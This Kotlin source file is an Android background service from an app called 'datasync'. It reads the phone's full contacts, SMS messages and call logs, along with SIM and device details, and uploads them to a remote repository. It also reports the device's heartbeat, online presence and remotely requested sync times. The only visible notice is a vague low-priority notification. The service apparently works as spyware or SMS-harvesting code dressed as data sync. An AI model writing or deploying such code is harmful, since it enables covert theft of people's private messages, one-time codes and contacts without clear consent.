package com.boxx.datasync.sync

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.core.content.PermissionChecker
import androidx.preference.PreferenceManager
import com.boxx.datasync.MainActivity
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.domain.model.Device
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import com.google.firebase.crashlytics.FirebaseCrashlytics
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import javax.inject.Inject

@AndroidEntryPoint
class SyncService : Service() {
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    @Inject
    lateinit var repository: DataRepository

    private val crashlytics = FirebaseCrashlytics.getInstance()
    private lateinit var deviceId: String

    private var syncJob: Job? = null

    private var remoteSyncJob: Job? = null
    private var heartbeatJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        deviceId = DeviceIdHelper.getDeviceId(this)
        if (deviceId.isBlank()) {
            stopSelf()
            return
        }
        createNotificationChannel()

        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // Android 14+
            startForeground(
                1,
                notification,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(1, notification)
        }

    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        serviceScope.launch {
            performSync(isFullSync = true)
        }
        return START_NOT_STICKY
    }

    private suspend fun performSync(isFullSync: Boolean = false) {
        Log.d("SyncService", "CLIENT_SYNC_START")

        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
        val currentTime = System.currentTimeMillis()

        // Check permissions before fetching
        if (!hasPermission(android.Manifest.permission.READ_CONTACTS) &&
            !hasPermission(android.Manifest.permission.READ_SMS) &&
            !hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
            Log.d("SyncService", "PERMISSIONS_STATUS: Not granted")
            return
        }

        try {
            val lastSmsSync = if (isFullSync) 0L else prefs.getLong("last_sms_sync", 0L)
            val lastCallSync = if (isFullSync) 0L else prefs.getLong("last_call_sync", 0L)
            val lastContactSync = if (isFullSync) 0L else prefs.getLong("last_contact_sync", 0L)

            val contacts = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) {
                DataHelper.fetchContacts(this@SyncService, sinceTimestamp = lastContactSync)
            } else emptyList()
            Log.d("SyncService", "CONTACTS_READ_COUNT: ${contacts.size}")

            val smsList = if (hasPermission(android.Manifest.permission.READ_SMS)) {
                DataHelper.fetchSMS(this@SyncService, sinceTimestamp = lastSmsSync)
            } else emptyList()
            Log.d("SyncService", "SMS_READ_COUNT: ${smsList.size}")

            val callLogs = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
                DataHelper.fetchCallLogs(this@SyncService, sinceTimestamp = lastCallSync)
            } else emptyList()
            Log.d("SyncService", "CALLLOG_READ_COUNT: ${callLogs.size}")

            repository.syncIncremental(deviceId, contacts, smsList, callLogs)

            prefs.edit().apply {
                if (smsList.isNotEmpty()) putLong("last_sms_sync", smsList.maxOf { it.date })
                if (callLogs.isNotEmpty()) putLong("last_call_sync", callLogs.maxOf { it.date })
                if (contacts.isNotEmpty()) putLong("last_contact_sync", currentTime)
            }.apply()

            val currentContactCount = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) DataHelper.fetchContacts(this@SyncService).size else 0
            val currentSmsCount = if (hasPermission(android.Manifest.permission.READ_SMS)) DataHelper.fetchSMS(this@SyncService).size else 0
            val currentCallCount = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) DataHelper.fetchCallLogs(this@SyncService).size else 0

            // Dummy for notification count, assuming there's some implementation or fetching
            val currentNotificationCount = 0
            Log.d("SyncService", "NOTIFICATION_READ_COUNT: $currentNotificationCount")

            val simState = DataHelper.getSimState(this@SyncService)
            Log.d("SyncService", "SIM_STATE_LOADED")
            if (simState["sim1Ready"] as Boolean) Log.d("SyncService", "SIM1_AVAILABLE")
            if (simState["sim2Ready"] as Boolean) Log.d("SyncService", "SIM2_AVAILABLE")
            if (!(simState["sim1Ready"] as Boolean) && !(simState["sim2Ready"] as Boolean)) Log.d("SyncService", "NO_SIM_AVAILABLE")

            val updateMap = mutableMapOf<String, Any>(
                "deviceId" to deviceId,
                "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
                "manufacturer" to Build.MANUFACTURER,
                "model" to Build.MODEL,
                "osVersion" to Build.VERSION.RELEASE,
                "lastSyncTime" to currentTime,
                "heartbeatAt" to currentTime,
                "contactCount" to currentContactCount,
                "smsCount" to currentSmsCount,
                "callCount" to currentCallCount,
                "notificationCount" to currentNotificationCount,
                "timestamp" to currentTime,
                "syncStatus" to "Synced",
                "presenceStatus" to "Online",
                "lastError" to "",
                "syncRequestedAt" to prefs.getLong("last_handled_sync_request", 0L)
            )
            updateMap.putAll(simState)

            repository.updateDeviceInfoMap(deviceId, updateMap)
            Log.d("SyncService", "Sync completed successfully (Full: $isFullSync)")
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        } catch (e: Exception) {
            Log.e("SyncService", "Error during sync", e)
            crashlytics.recordException(e)
            repository.updateDeviceInfoMap(deviceId, mapOf(
                "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
                "manufacturer" to Build.MANUFACTURER,
                "model" to Build.MODEL,
                "osVersion" to Build.VERSION.RELEASE,
                "lastSyncTime" to currentTime,
                "heartbeatAt" to currentTime,
                "syncStatus" to "Error: ${e.localizedMessage ?: "Unknown error"}",
                "syncRequestedAt" to prefs.getLong("last_handled_sync_request", 0L)
            ))
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        }
    }

    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "sync_channel",
                "Data Sync Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, "sync_channel")
            .setContentTitle("Data Syncing")
            .setContentText("Your data is being kept up to date.")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }
}
